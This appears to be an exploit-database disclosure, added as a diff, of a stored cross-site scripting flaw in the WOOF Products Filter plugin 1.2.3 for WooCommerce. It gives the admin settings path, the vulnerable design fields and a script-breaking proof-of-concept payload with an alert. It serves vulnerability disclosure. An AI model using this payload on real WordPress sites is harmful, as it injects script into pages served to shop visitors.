@@ -1,0 +1,29 @@
+# Exploit Title: Wordpress Plugin WOOF Products Filter for WooCommerce 1.2.3 - Persistent Cross-Site Scripting
+# Date: 2020-02-15
+# Exploit Author: Shahab.ra.9
+# Vendor Homepage: https://products-filter.com/
+# Software Link: https://wordpress.org/plugins/woocommerce-products-filter/
+# Version: 1.2.3
+# Tested on: windows 10
+# WOOF - Products Filter for WooCommerce
+
+Exploit:
+http://target/wp-admin/admin.php?page=wc-settings&tab=woof
+
+now in tab "design" -> then enter (xss code) in the (textfields) front side
+->(Text for block toggle ,Text for block toggle , Custom front css styles
+file link).
+then click on button "save changes".
+then refresh page ,now you see the execution of xss code ,then refersh
+frontend page site -> "http://target/shop/ " or frontend pages used this
+plugin the execution of xss code.
+
+Demo Poc:
+
+http://target/wp-admin/admin.php?page=wc-settings&tab=woof
+
+now in tab "design" -> then enter ( ";</script><img src=1
+onerror="alert(`xss store bug -> shahab.ra.9`);"><script>var1="1 ) in the
+(textfields) front side ->(Text for block toggle ,Text for block toggle and
+Custom front css styles file link).
+then click on button "save changes".
